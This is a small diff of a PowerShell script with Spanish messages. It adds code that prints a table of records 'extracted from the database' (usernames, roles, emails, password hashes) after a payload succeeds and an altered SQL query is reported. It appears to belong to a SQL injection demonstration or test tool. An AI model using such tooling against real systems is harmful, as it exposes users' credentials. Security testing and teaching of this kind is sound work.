@@ -76,6 +76,10 @@ try {
         if ($res1.debug_query) {
             Write-Host "    Consulta SQL alterada: $($res1.debug_query)" -ForegroundColor DarkCyan
         }
+        if ($res1.database -and $res1.database.records) {
+            Write-Host "`n    [+] TABLA EXTRAÍDA DE LA BASE DE DATOS ($($res1.database.table_name)):" -ForegroundColor Cyan
+            $res1.database.records | Format-Table id, username, role, email, password_hash -AutoSize
+        }
     } else {
         Write-Host " [-] El servidor no respondió con éxito al payload." -ForegroundColor Red
     }
